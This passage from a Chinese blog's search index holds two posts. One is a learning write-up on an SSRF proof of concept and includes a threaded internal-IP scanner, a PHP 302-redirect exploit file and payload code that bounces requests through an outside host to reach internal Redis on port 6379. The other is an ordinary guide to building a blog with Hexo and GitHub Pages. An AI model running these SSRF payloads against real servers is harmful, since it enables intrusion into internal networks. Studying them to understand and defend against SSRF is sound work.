class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):<span class="comment">#新建进程排序对列</span></span><br><span class="line">    que.put(ip + str(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(threads_count):</span><br><span class="line">    t = threading.Thread(target=run)</span><br><span class="line">    threads.append(t)</span><br><span class="line">    t.setDaemon(<span class="keyword">True</span>)<span class="comment">#打开主线程为守护进程</span></span><br><span class="line">    t.start()</span><br><span class="line"><span class="keyword">while</span> que.qsize() &gt; <span class="number">0</span>:</span><br><span class="line">    time.sleep(<span class="number">1.0</span>)<span class="comment">#在打开守护进程的环境下保证等候队列执行到空</span></span><br></pre></td></tr></table></figure><h6 id="学习资料链接："><a href="#学习资料链接：" class="headerlink" title="学习资料链接："></a>学习资料链接：</h6><ul><li><a href="http://www.runoob.com/python/python-multithreading.html" target="_blank" rel="noopener">python thread库</a></li><li><a href="http://www.cnblogs.com/itogo/p/5635629.html" target="_blank" rel="noopener">python quene库</a></li><li><a href="https://github.com/PyxYuYu/MyBlog/issues/100" target="_blank" rel="noopener">ssrf背景与302跳转之类的绕过</a></li><li><a href="https://github.com/louchaooo/louchaooo.github.io/issues/78" target="_blank" rel="noopener">6379 port 漏洞情况</a></li><li><a href="https://zh.wikipedia.org/wiki/HTTP_302" target="_blank" rel="noopener">http302状态码</a></li><li><a href="https://windard.com/project/2016/05/08/Forge-IP-Address" target="_blank" rel="noopener">“X-Forwarded-For”在http协议层上的ip伪造理解</a></li></ul><h4 id="反思："><a href="#反思：" class="headerlink" title="反思："></a>反思：</h4><blockquote><p>ssrf漏洞和xss漏洞有着相似的实现手法，尽管xss分为存储型和反射型，但都是在client端实现攻击（即使 存储型是存储在服务端，但攻击的对象仍是client），类似于”document.cookie”，脚本执行和跳转等，但是ssrf是基于server端,让服务器作为跳板去实现本身无法从外网对内网的操作，如嗅探以及漏洞利用。</p><p>对poc的一点理解与感悟：</p><ol><li>攻击具有一定的伪装功能，getIP（）中x-forwarded-for请求头的合理应用，实现了IP层以上的身份隐藏（因为无法实现tcp握手包的欺骗），并且不只是定向的扫描一个端口（容易被墙），额外扫描了65321端口（读者才浅，一时不知道为何要这么扫描，生搬硬套，勿怪，还望高人指点）</li><li>然后就是运行的性能上，调用了线程，锁，以及等待FIFO对列，加速了扫描的速度。</li><li>302跳转实质就是构造一个指向另一个location的并且可以传递攻击参数的自定义php文件，让存在ssrf漏洞的服务主机去访问，从而跳转到内网（有点绕，简单就是在确保服务器会访问你的web文件的前提下构造个你自己本地php脚本让它跳转到被攻击服务器内网），进而继续实现漏洞利用。附上该302攻击的 exp.php：</li></ol></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">$port = $_GET[<span class="string">'port'</span>];</span><br><span class="line">$scheme = $_GET[<span class="string">'s'</span>];</span><br><span class="line">$data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">header(<span class="string">"Location: $scheme://$ip:$port/$data"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>整个poc的关键代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"http://tv.phpinfo.me/exp.php?s=ftp%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=helo.jpg"</span>.format(</span><br><span class="line">               ip=ip,</span><br><span class="line">               port=<span class="string">"6379"</span>)</span><br><span class="line">param = &#123;<span class="string">"imgurl"</span>:payload&#125;</span><br><span class="line">r = requests.post(url,data=param,headers=headers,timeout=<span class="number">2.2</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> poc_learning </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>hello blog</title>
      <link href="/2017/03/26/hello-blog(1)/"/>
      <url>/2017/03/26/hello-blog(1)/</url>
      
        <content type="html"><![CDATA[<h4 id="兜兜转转，花了近一个礼拜左右的时间，终于完成了自己博客雏形的搭建。搭建博客大致可以分为三种模式："><a href="#兜兜转转，花了近一个礼拜左右的时间，终于完成了自己博客雏形的搭建。搭建博客大致可以分为三种模式：" class="headerlink" title="兜兜转转，花了近一个礼拜左右的时间，终于完成了自己博客雏形的搭建。搭建博客大致可以分为三种模式："></a>兜兜转转，花了近一个礼拜左右的时间，终于完成了自己博客雏形的搭建。搭建博客大致可以分为三种模式：</h4><ul><li><p>去新浪，blogz等博客网站去申请账号开始大众化的博客之路。这方式最简单，当然自由度不高，无法获取源代码，也无法做很多关于基层的代码操作，界面也无法实现个性化，总之就是比较受限制。</p></li><li><p>自己买服务器，数据库，虚拟主机（现在有较多国内国外的提供服务商：阿里云，百度云，腾讯云，亚马逊云，凡科建站and so on）&lt;!—这类方式就是花钱买服务，比如服务器流量与内存。如果是购买云之类的话，用wordpress搭建还算简单的，就是有点小贵，不算买域名，就是说运用人家的二级域名的话，一年也要好几百，感觉是有点贵的。当然如果你想去自己买个实体服务器来折腾也是可以的，前提是有足够的money，而且还要自己去搭建环境，总的来说似乎是不适合我们学生群体的。</p></li><li><p>该类方法就是通过开源社区作为网站挂载平台，例如cording，github，……，不需要像上面第二点提到的那样自己去管理网站，它寄人篱下却又能给你极大的自主性，代码开源，就意味着你完全可以自己去搭建想要的blog，最最重要的是你不买域名的话基本花不了一分钱，买域名一年也不贵嘛，星巴克一两杯coffee的钱就搞定了。而且由于是开源，这类blog的建立就会受到社区的大力支持，他们各种的开源工具也会为你提供方便，很多代码都是集成的的，只需要改点个性化的参数就可以了，很是便利的呢！</p><a id="more"></a></li></ul><hr><p>废话不多说，直接上干货</p><h4 id="本次采用的形式是github-page-hexo的环境（当然node，git，markdown编辑器还是要安装的啦）"><a href="#本次采用的形式是github-page-hexo的环境（当然node，git，markdown编辑器还是要安装的啦）" class="headerlink" title="本次采用的形式是github page+hexo的环境（当然node，git，markdown编辑器还是要安装的啦）"></a>本次采用的形式是github page+hexo的环境（当然node，git，markdown编辑器还是要安装的啦）</h4><p>好了，说说我建站的过程吧：</p><ol><li>首先当然是去github里面注册个账号</li><li>然后新建个repostory，修改名字为：【yourname】.github.io(这是硬性规定，想要以github page 模块建站就必须按这样的格式去做)<br>，到这部分结束你就可以说是建立好了一个网站的基点，一个托管在github开源社区的</li><li>下载我之前所叙述的种种工具，也就是最基本的环境搭建</li></ol><p>注：由于是自己的总结，加上网上教程很多，这里给出一些连接，方便细节的处理：</p><p><a href="http://jingyan.baidu.com/article/a378c96093ef51b328283026.html" target="_blank" rel="noopener">Hexo 入门指南一</a></p><p>(当然也还有各种博客里说了这种建站方式，很多方法大同小异)</p><hr><p>具体的部署过程上面的链接基本都会有介绍下面就来说说我目前建站的坑吧：</p><p>1.在本地clone的库里部署好hexo后_config.yml的参数设置需要谨慎，一定记得在item：后加个空格再修改参数，还有就是最好留个备份。<br>2.在下载hexo时最好和git关联：<br>npm install hexo-server —save</p><p>  npm install hexo-deployer-git —save不然的话在后期上传时，使用hexo deploy时出现cannot find the git<br>的错误呢</p><p>3.下载git时最好还是在安装过程中：into path选项打勾，不然要自己去设置环境path参数，即把git文件里bin文件的位置添加到path（所谓path即为我的计算机里的高级设置里的环境变量的设置）</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
  
  
</search>
